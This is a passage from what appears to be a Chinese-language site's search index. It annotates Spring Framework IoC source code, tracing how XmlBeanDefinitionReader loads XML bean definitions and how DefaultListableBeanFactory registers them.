given BeanFactory.\n    // \u200b\u901a\u8fc7\u200b\u4e0a\u200b\u4e00\u6b65\u200b\u521b\u5efa\u200b\u7684\u200b\u7a7a\u200bBeanFactory\u200b\u6765\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200bXmlBeanDefinitionReader\u200b\u5bf9\u8c61\u200b\n    // XmlBeanDefinitionReader\u200b\u7528\u4e8e\u200b\u89e3\u6790\u200bxml\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200bbean\n    XmlBeanDefinitionReader beanDefinitionReader = new XmlBeanDefinitionReader(beanFactory); //\n\n    // Configure the bean definition reader with this context's\n    // resource loading environment.\n    beanDefinitionReader.setEnvironment(this.getEnvironment());\n    beanDefinitionReader.setResourceLoader(this);\n    beanDefinitionReader.setEntityResolver(new ResourceEntityResolver(this));\n\n    // Allow a subclass to provide custom initialization of the reader,\n    // then proceed with actually loading the bean definitions.\n    initBeanDefinitionReader(beanDefinitionReader);\n    loadBeanDefinitions(beanDefinitionReader); //\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5165\u200b\u53c2\u662f\u200b\u4e0a\u9762\u200b\u751f\u6210\u200b\u7684\u200bbeanDefinitionReader\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#new-xmlbeandefinitionreaderbeanfactory","title":"new XmlBeanDefinitionReader(beanFactory)","text":"<ul> <li>XmlBeanDefinitionReader(beanFactory)\u200b\u6784\u9020\u65b9\u6cd5\u200b\u8c03\u7528\u200b\u5176\u7236\u200b\u7c7b\u200bAbstractBeanDefinitionReader\u200b\u7684\u200b\u6784\u9020\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u5982\u4e0b\u200b Java<pre><code>protected AbstractBeanDefinitionReader(BeanDefinitionRegistry registry) {\n    Assert.notNull(registry, \"BeanDefinitionRegistry must not be null\");\n    this.registry = registry;\n\n    // Determine ResourceLoader to use.\n    if (this.registry instanceof ResourceLoader) {\n        this.resourceLoader = (ResourceLoader) this.registry;\n    }\n    else {\n        this.resourceLoader = new PathMatchingResourcePatternResolver();\n    }\n\n    // Inherit Environment if possible\n    if (this.registry instanceof EnvironmentCapable) {\n        this.environment = ((EnvironmentCapable) this.registry).getEnvironment();\n    }\n    else {\n        this.environment = new StandardEnvironment();\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractxmlapplicationcontextinitbeandefinitionreaderbeandefinitionreader","title":"AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200binitBeanDefinitionReader(beanDefinitionReader)\u200b\u65b9\u6cd5","text":"Java<pre><code>protected void initBeanDefinitionReader(XmlBeanDefinitionReader reader) {\n    reader.setValidating(this.validating);\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#abstractxmlapplicationcontextloadbeandefinitionsxmlbeandefinitionreader-reader","title":"AbstractXmlApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(XmlBeanDefinitionReader reader)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4e3b\u8981\u200b\u529f\u80fd\u200b\u662f\u200b\u89e3\u6790\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u4f4d\u7f6e\u200b</li> <li>\u200b\u8c03\u7528\u200bXmlBeanDefinitionReader\u200b\u5bf9\u8c61\u200b\u7684\u200bloadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u89e3\u6790\u200bbean\u200b\u7684\u200b\u5b9a\u4e49\u200b Java<pre><code>protected void loadBeanDefinitions(XmlBeanDefinitionReader reader) throws BeansException, IOException {\n    Resource[] configResources = getConfigResources();\n    if (configResources != null) {\n        reader.loadBeanDefinitions(configResources); //\u200b\u5177\u4f53\u200b\u8c03\u7528\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200bloadBeanDefinitions(Resource... resources)\u200b\u65b9\u6cd5\u200b\n    }\n    String[] configLocations = getConfigLocations();\n    if (configLocations != null) {\n        reader.loadBeanDefinitions(configLocations);//\u200b\u5177\u4f53\u200b\u8c03\u7528\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200bloadBeanDefinitions(String... locations)\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#readerloadbeandefinitionsconfigresourcesreaderloadbeandefinitionsconfiglocations","title":"reader.loadBeanDefinitions(configResources)\u200b\u65b9\u6cd5\u200b\u4e0e\u200breader.loadBeanDefinitions(configLocations)\u200b\u65b9\u6cd5","text":"<ul> <li>XmlBeanDefinitionReader\u200b\u5bf9\u8c61\u200b\u7684\u200bloadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u7528\u4e8e\u200b\u89e3\u6790\u200bbean\u200b\u7684\u200b\u5b9a\u4e49\u200b</li> <li>reader\u200b\u662f\u200bXmlBeanDefinitionReader\u200b\u7c7b\u578b\u200b\u7684\u200b\u5bf9\u8c61\u200b\uff0cloadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bBeanDefinitionReader\u200b\u63a5\u53e3\u200b\u4e2d\u200b\uff0c</li> <li>loadBeanDefinitions\u200b\u65b9\u6cd5\u200b\u5177\u4f53\u200b\u662f\u200b\u5728\u200bAbstractBeanDefinitionReader\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff0c\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>@Override\npublic int loadBeanDefinitions(Resource... resources) throws BeanDefinitionStoreException {\n    Assert.notNull(resources, \"Resource array must not be null\");\n    int count = 0;\n    // \u200b\u904d\u5386\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u8d44\u6e90\u200b\u5e76\u200b\u4f9d\u6b21\u200b\u8c03\u7528\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(Resource resource)\uff0c\u200b\u5b9a\u4e49\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b\n    for (Resource resource : resources) {\n        count += loadBeanDefinitions(resource);//\n    }\n    return count;\n}\n\n@Override\npublic int loadBeanDefinitions(String... locations) throws BeanDefinitionStoreException {\n    Assert.notNull(locations, \"Location array must not be null\");\n    int count = 0;\n    //\u200b\u904d\u5386\u200b\u8d44\u6e90\u200b\u6570\u7ec4\u200b\uff0c\u200b\u8c03\u7528\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(String location)\n    for (String location : locations) {\n        count += loadBeanDefinitions(location);//\n    }\n    return count;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#count-loadbeandefinitionsresourceloadbeandefinitionsresource","title":"count += loadBeanDefinitions(resource)\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(resource)\u200b\u65b9\u6cd5","text":"<ul> <li>loadBeanDefinitions(resource)\u200b\u65b9\u6cd5\u200b\u5728\u200bBeanDefinitionReader\u200b\u63a5\u53e3\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u662f\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b</li> <li>XmlBeanDefinitionReader\u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>@Override\npublic int loadBeanDefinitions(Resource resource) throws BeanDefinitionStoreException {\n    return loadBeanDefinitions(new EncodedResource(resource));\n}\n</code></pre></li> <li>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4e0a\u9762\u200b\u7684\u200b\u65b9\u6cd5\u200b\u53c8\u200b\u8c03\u7528\u200b\u4e86\u200bloadBeanDefinitions(new EncodedResource(resource))\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8be5\u200b\u65b9\u6cd5\u200b\u5728\u200bBeanDefinitionReader\u200b\u63a5\u53e3\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200bXmlBeanDefinitionReader\u200b\u4e2d\u200b,\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u8be6\u7ec6\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>public int loadBeanDefinitions(EncodedResource encodedResource) throws BeanDefinitionStoreException {\n    Assert.notNull(encodedResource, \"EncodedResource must not be null\");\n    if (logger.isTraceEnabled()) {\n        logger.trace(\"Loading XML bean definitions from \" + encodedResource);\n    }\n\n    Set&lt;EncodedResource&gt; currentResources = this.resourcesCurrentlyBeingLoaded.get();\n    if (currentResources == null) {\n        currentResources = new HashSet&lt;&gt;(4);\n        this.resourcesCurrentlyBeingLoaded.set(currentResources);\n    }\n    if (!currentResources.add(encodedResource)) {\n        throw new BeanDefinitionStoreException(\"Detected cyclic loading of \" + encodedResource + \" - check your import definitions!\");\n    }\n    try {\n        //\u200b\u4ee5\u6d41\u200b\u7684\u200b\u5f62\u5f0f\u200b\u8bfb\u53d6\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\n        InputStream inputStream = encodedResource.getResource().getInputStream();\n        try {\n            InputSource inputSource = new InputSource(inputStream);\n            if (encodedResource.getEncoding() != null) {\n                inputSource.setEncoding(encodedResource.getEncoding());\n            }\n            // \u200b\u8c03\u7528\u200bdoLoadBeanDefinitions\u200b\u89e3\u6790\u200b\u8f7d\u5165\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200bbean\u200b\u5b9a\u4e49\u200b\n            return doLoadBeanDefinitions(inputSource, encodedResource.getResource());\n        }\n        finally {\n            inputStream.close();\n        }\n    }\n    catch (IOException ex) {\n        throw new BeanDefinitionStoreException(\n                \"IOException parsing XML document from \" + encodedResource.getResource(), ex);\n    }\n    finally {\n        currentResources.remove(encodedResource);\n        if (currentResources.isEmpty()) {\n            this.resourcesCurrentlyBeingLoaded.remove();\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#count-loadbeandefinitionslocationloadbeandefinitionslocation","title":"count += loadBeanDefinitions(location)\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(location)\u200b\u65b9\u6cd5","text":"<ul> <li>loadBeanDefinitions(location)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\uff1b Java<pre><code>@Override\npublic int loadBeanDefinitions(String location) throws BeanDefinitionStoreException {\n    return loadBeanDefinitions(location, null);\n}\n</code></pre></li> <li>\u200b\u89e3\u6790\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u5f97\u5230\u200bResource[]\u200b\u8d44\u6e90\u200b\u6570\u7ec4\u200b</li> <li>\u200b\u4e0a\u9762\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(String location)\u200b\u65b9\u6cd5\u200b\u53c8\u200b\u8c03\u7528\u200b\u4e86\u200b\u540c\u7c7b\u200b\u91cc\u9762\u200b\u7684\u200b\u4e00\u4e2a\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(String location, @Nullable Set actualResources) \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>public int loadBeanDefinitions(String location, @Nullable Set&lt;Resource&gt; actualResources) throws BeanDefinitionStoreException {\n        ResourceLoader resourceLoader = getResourceLoader();\n        if (resourceLoader == null) {\n            throw new BeanDefinitionStoreException(\n                    \"Cannot load bean definitions from location [\" + location + \"]: no ResourceLoader available\");\n        }\n\n        if (resourceLoader instanceof ResourcePatternResolver) {\n            // Resource pattern matching available.\n            try {\n                Resource[] resources = ((ResourcePatternResolver) resourceLoader).getResources(location);\n                //\u200b\u4e0b\u200b\u4e00\u884c\u200b\u7684\u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b  \u200b\u8c03\u7528\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(Resource resource)\n                int count = loadBeanDefinitions(resources);\n                if (actualResources != null) {\n                    Collections.addAll(actualResources, resources);\n                }\n                if (logger.isTraceEnabled()) {\n                    logger.trace(\"Loaded \" + count + \" bean definitions from location pattern [\" + location + \"]\");\n                }\n                return count;\n            }\n            catch (IOException ex) {\n                throw new BeanDefinitionStoreException(\n                        \"Could not resolve bean definition resource pattern [\" + location + \"]\", ex);\n            }\n        }\n        else {\n            // Can only load single resources by absolute URL.\n            Resource resource = resourceLoader.getResource(location);\n            int count = loadBeanDefinitions(resource);\n            if (actualResources != null) {\n                actualResources.add(resource);\n            }\n            if (logger.isTraceEnabled()) {\n                logger.trace(\"Loaded \" + count + \" bean definitions from location [\" + location + \"]\");\n            }\n            return count;\n        }\n    }\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#xmlbeandefinitionreaderdoloadbeandefinitionsinputsource-inputsource-resource-resource","title":"XmlBeanDefinitionReader\u200b\u7c7b\u4e2d\u200b\u7684\u200bdoLoadBeanDefinitions(InputSource inputSource, Resource resource)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u8be5\u200b\u65b9\u6cd5\u200b\u662f\u200b\u8f7d\u5165\u200b\u5b9a\u4e49\u200bbean\u200b\u7684\u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.xml.XmlBeanDefinitionReader Java<pre><code>protected int doLoadBeanDefinitions(InputSource inputSource, Resource resource)\n        throws BeanDefinitionStoreException {\n\n    try {\n        // \u200b\u89e3\u6790\u200bXML\u200b\u6587\u6863\u200b\n        Document doc = doLoadDocument(inputSource, resource);\n        // \u200b\u4e0b\u9762\u200b\u4e00\u884c\u200b\u4ee3\u7801\u200b \u200b\u6ce8\u518c\u200bBean\n        int count = registerBeanDefinitions(doc, resource);\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"Loaded \" + count + \" bean definitions from \" + resource);\n        }\n        return count;\n    }\n    catch (BeanDefinitionStoreException ex) {\n        throw ex;\n    }\n    catch (SAXParseException ex) {\n        throw new XmlBeanDefinitionStoreException(resource.getDescription(),\n                \"Line \" + ex.getLineNumber() + \" in XML document from \" + resource + \" is invalid\", ex);\n    }\n    catch (SAXException ex) {\n        throw new XmlBeanDefinitionStoreException(resource.getDescription(),\n                \"XML document from \" + resource + \" is invalid\", ex);\n    }\n    catch (ParserConfigurationException ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                \"Parser configuration exception parsing XML from \" + resource, ex);\n    }\n    catch (IOException ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                \"IOException parsing XML document from \" + resource, ex);\n    }\n    catch (Throwable ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                \"Unexpected exception parsing XML document from \" + resource, ex);\n    }\n}\n\n// \u200b\u6ce8\u518c\u200bBean\u200b\u7684\u200b\u65b9\u6cd5\u200b\npublic int registerBeanDefinitions(Document doc, Resource resource) throws BeanDefinitionStoreException {\n    BeanDefinitionDocumentReader documentReader = createBeanDefinitionDocumentReader();\n    int countBefore = getRegistry().getBeanDefinitionCount();\n    // \u200b\u6ce8\u518c\u200bbean\u200b\u7684\u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n    documentReader.registerBeanDefinitions(doc, createReaderContext(resource));\n    return getRegistry().getBeanDefinitionCount() - countBefore;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#defaultbeandefinitiondocumentreaderregisterbeandefinitionsdocument-doc-xmlreadercontext-readercontext","title":"DefaultBeanDefinitionDocumentReader.registerBeanDefinitions(Document doc, XmlReaderContext readerContext)","text":"<ul> <li>\u200b\u529f\u80fd\u200b\uff1a</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader Java<pre><code>@Override\npublic void registerBeanDefinitions(Document doc, XmlReaderContext readerContext) {\n    this.readerContext = readerContext;\n    // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n    doRegisterBeanDefinitions(doc.getDocumentElement());\n}\n\n// registerBeanDefinitions\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bdoRegisterBeanDefinitions\u200b\u65b9\u6cd5\u200b\n@SuppressWarnings(\"deprecation\")  // for Environment.acceptsProfiles(String...)\nprotected void doRegisterBeanDefinitions(Element root) {\n    // Any nested &lt;beans&gt; elements will cause recursion in this method. In\n    // order to propagate and preserve &lt;beans&gt; default-* attributes correctly,\n    // keep track of the current (parent) delegate, which may be null. Create\n    // the new (child) delegate with a reference to the parent for fallback purposes,\n    // then ultimately reset this.delegate back to its original (parent) reference.\n    // this behavior emulates a stack of delegates without actually necessitating one.\n    BeanDefinitionParserDelegate parent = this.delegate;\n    this.delegate = createDelegate(getReaderContext(), root, parent);\n\n    if (this.delegate.isDefaultNamespace(root)) {\n        String profileSpec = root.getAttribute(PROFILE_ATTRIBUTE);\n        if (StringUtils.hasText(profileSpec)) {\n            String[] specifiedProfiles = StringUtils.tokenizeToStringArray(\n                    profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);\n            // We cannot use Profiles.of(...) since profile expressions are not supported\n            // in XML config. See SPR-12458 for details.\n            if (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) {\n                if (logger.isDebugEnabled()) {\n                    logger.debug(\"Skipped XML bean definition file due to specified profiles [\" + profileSpec +\n                            \"] not matching: \" + getReaderContext().getResource());\n                }\n                return;\n            }\n        }\n    }\n\n    preProcessXml(root);\n    // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n    parseBeanDefinitions(root, this.delegate);\n    postProcessXml(root);\n\n    this.delegate = parent;\n}\n\n// \u200b\u4e0a\u9762\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bparseBeanDefinitions(root, this.delegate)\u200b\u5bf9\u5e94\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5b9e\u73b0\u200b\nprotected void parseBeanDefinitions(Element root, BeanDefinitionParserDelegate delegate) {\n    if (delegate.isDefaultNamespace(root)) {\n        NodeList nl = root.getChildNodes();\n        for (int i = 0; i &lt; nl.getLength(); i++) {\n            Node node = nl.item(i);\n            if (node instanceof Element) {\n                Element ele = (Element) node;\n                if (delegate.isDefaultNamespace(ele)) {\n                    // \u200b\u672c\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n                    parseDefaultElement(ele, delegate);\n                }\n                else {\n                    delegate.parseCustomElement(ele);\n                }\n            }\n        }\n    }\n    else {\n        delegate.parseCustomElement(root);\n    }\n}\n\n\n// \u200b\u4e0a\u8ff0\u200b\u65b9\u6cd5\u200b\u8c03\u7528\u200b\u7684\u200bparseDefaultElement(ele, delegate);\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\n// \u200b\u6839\u636e\u200bbean\u200b\u914d\u7f6e\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8fdb\u5165\u200b\u4e0d\u540c\u200b\u5206\u652f\u200b\nprivate void parseDefaultElement(Element ele, BeanDefinitionParserDelegate delegate) {\n    if (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) {\n        importBeanDefinitionResource(ele);\n    }\n    else if (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) {\n        processAliasRegistration(ele);\n    }\n    else if (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) {\n        // \u200b\u672c\u6587\u200b\u793a\u4f8b\u200b\u4f1a\u200b\u8fdb\u5165\u200b\u8be5\u200b\u65b9\u6cd5\u200b\n        processBeanDefinition(ele, delegate);\n    }\n    else if (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) {\n        // recurse\n        doRegisterBeanDefinitions(ele);\n    }\n}\n\n// \u200b\u4e0a\u8ff0\u200b\u65b9\u6cd5\u200b\u6700\u540e\u200b\u8fdb\u5165\u200bprocessBeanDefinition(ele, delegate)\u200b\u540e\u200b\u7684\u200b\u5904\u7406\u8fc7\u7a0b\u200b\uff1a\nprotected void processBeanDefinition(Element ele, BeanDefinitionParserDelegate delegate) {\n    BeanDefinitionHolder bdHolder = delegate.parseBeanDefinitionElement(ele);\n    if (bdHolder != null) {\n        bdHolder = delegate.decorateBeanDefinitionIfRequired(ele, bdHolder);\n        try {\n            // Register the final decorated instance.\n            // \u200b\u6ce8\u518c\u200bBean\u200b\u7684\u200b\u5173\u952e\u200b\u4ee3\u7801\u200b\n            BeanDefinitionReaderUtils.registerBeanDefinition(bdHolder, getReaderContext().getRegistry());\n        }\n        catch (BeanDefinitionStoreException ex) {\n            getReaderContext().error(\"Failed to register bean definition with name '\" +\n                    bdHolder.getBeanName() + \"'\", ele, ex);\n        }\n        // Send registration event.\n        getReaderContext().fireComponentRegistered(new BeanComponentDefinition(bdHolder));\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#beandefinitionreaderutilsregisterbeandefinitionbdholder-getreadercontextgetregistry","title":"BeanDefinitionReaderUtils\u200b\u7684\u200bregisterBeanDefinition(bdHolder, getReaderContext().getRegistry())\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4e3b\u8981\u200b\u4f5c\u7528\u200b\uff1a</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.BeanDefinitionReaderUtils Java<pre><code>public static void registerBeanDefinition(\n        BeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry)\n        throws BeanDefinitionStoreException {\n\n    // Register bean definition under primary name.\n    String beanName = definitionHolder.getBeanName();\n    // \u200b\u5c06\u200bBean\u200b\u7684\u200b\u540d\u5b57\u200b\u548c\u200bBeanDefinition\u200b\u5bf9\u8c61\u200b\u8fdb\u884c\u200b\u6ce8\u518c\u200b\n    // registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bBeanDefinitionRegistry\u200b\u63a5\u53e3\u200b\u4e2d\u200b\uff1a\n    // \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\n    registry.registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());\n\n    // Register aliases for bean name, if any.\n    String[] aliases = definitionHolder.getAliases();\n    if (aliases != null) {\n        for (String alias : aliases) {\n            registry.registerAlias(beanName, alias);\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#defaultlistablebeanfactoryregisterbeandefinitionstring-beanname-beandefinition-beandefinition","title":"DefaultListableBeanFactory\u200b\u4e2d\u200bregisterBeanDefinition(String beanName, BeanDefinition beanDefinition)","text":"<ul> <li>\u200b\u4f5c\u7528\u200b\uff1a</li> <li>DefaultListableBeanFactory\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200bbeanDefinitionMap\u200b\u662f\u200b\u4e00\u4e2a\u200bConcurrentHashMap\uff0c\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200bbean\u200b\u7684\u200b\u5b9a\u4e49\u200b\u4fe1\u606f\u200b <li>DefaultListableBeanFactory\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200bbeanDefinitionNames\u200b\u662f\u200b\u4e00\u4e2a\u200bArrayList\u200b\u7c7b\u578b\u200b\u6570\u636e\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200bBean\u200b\u7684\u200b\u540d\u79f0\u200b <li> </li> <li>\u200b\u5230\u200b\u6b64\u200b\u4e0a\u9762\u200b\u7684\u200b loadBeanDefinitions(XmlBeanDefinitionReader reader)\u200b\u65b9\u6cd5\u200b\u57fa\u672c\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b</li> <li>\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u7684\u200bloadBeanDefinitions(DefaultListableBeanFactory beanFactory)\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u6267\u884c\u200b\u5230\u200bloadBeanDefinitions(XmlBeanDefinitionReader reader)\u200b\u65b9\u6cd5\u200b\u540e\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5728\u200b\u4e0a\u8ff0\u200b\u521b\u5efa\u200bBeanFactory\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0cBeanDefination\u200b\u6ce8\u518c\u200b\u5230\u200bBeanFactory\uff08DefaultListableBeanFactory\uff09\u200b\u4e2d\u200b\u7684\u200b\u7c7b\u578b\u200b\u4e3a\u200bConcurrentHashMap\uff0c\u200b\u5b57\u6bb5\u540d\u200bbeanDefinitionMap\u200b\u7684\u200b\u4e3a\u200b\u5bf9\u8c61\u200b\u4e2d\u200b <li>\u200b\u5411\u200bbeanDefinitionMap\u200b\u4e2d\u200b\u6ce8\u518c\u200b\u65f6\u200bbeanName\u200b\u4e3a\u200bkey,beanDefination\u200b\u4e3a\u200bvalue\uff1b</li> <li>DefaultListableBeanFactory\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200bbeanDefinitionNames\u200b\u662f\u200b\u4e00\u4e2a\u200bArrayList\u200b\u7c7b\u578b\u200b\u6570\u636e\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200b\u6240\u6709\u200b\u5df2\u7ecf\u200b\u6ce8\u518c\u200b\u7684\u200bBean\u200b\u7684\u200b\u540d\u79f0\u200b <li>refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u8fdb\u5165\u200b\u5176\u4e0b\u200b\u4e00\u884c\u200b\u7684\u200bgetBeanFactory()\u200b\u65b9\u6cd5\u200b</li>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#orgspringframeworkbeansfactorysupportdefaultlistablebeanfactory","title":"\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.DefaultListableBeanFactory","text":"Java<pre><code>@Override\npublic void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)\n        throws BeanDefinitionStoreException {\n\n    Assert.hasText(beanName, \"Bean name must not be empty\");\n    Assert.notNull(beanDefinition, \"BeanDefinition must not be null\");\n\n    if (beanDefinition instanceof AbstractBeanDefinition) {\n        try {\n            ((AbstractBeanDefinition) beanDefinition).validate();\n        }\n        catch (BeanDefinitionValidationException ex) {\n            throw new BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,\n                    \"Validation of bean definition failed\", ex);\n        }\n    }\n\n    BeanDefinition existingDefinition = this.beanDefinitionMap.get(beanName);\n    // \u200b\u67e5\u627e\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u540c\u540d\u200b\u7684\u200bbean\n    if (existingDefinition != null) {\n        // \u200b\u6709\u200b\u540c\u540d\u200b\u7684\u200bbean\u200b\u5b58\u5728\u200b\u65f6\u200b\n        if (!isAllowBeanDefinitionOverriding()) {\n            throw new BeanDefinitionOverrideException(beanName, beanDefinition, existingDefinition);\n        }\n        else if (existingDefinition.getRole() &lt; beanDefinition.getRole()) {\n            // e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE\n            if (logger.isInfoEnabled()) {\n                logger.info(\"Overriding user-defined bean definition for bean '\" + beanName +\n                        \"' with a framework-generated bean definition: replacing [\" +\n                        existingDefinition + \"] with [\" + beanDefinition + \"]\");\n            }\n        }\n        else if (!beanDefinition.equals(existingDefinition)) {\n            if (logger.isDebugEnabled()) {\n                logger.debug(\"Overriding bean definition for bean '\" + beanName +\n                        \"' with a different definition: replacing [\" + existingDefinition +\n                        \"] with [\" + beanDefinition + \"]\");\n            }\n        }\n        else {\n            if (logger.isTraceEnabled()) {\n                logger.trace(\"Overriding bean definition for bean '\" + beanName +\n                        \"' with an equivalent definition: replacing [\" + existingDefinition +\n                        \"] with [\" + beanDefinition + \"]\");\n            }\n        }\n        this.beanDefinitionMap.put(beanName, beanDefinition);\n    }\n    else {\n        // \u200b\u6ca1\u6709\u200b\u540c\u540d\u200b\u7684\u200bbean\u200b\u5b58\u5728\u200b\u65f6\u200b\n        if (hasBeanCreationStarted()) {\n            // Cannot modify startup-time collection elements anymore (for stable iteration)\n            synchronized (this.beanDefinitionMap) 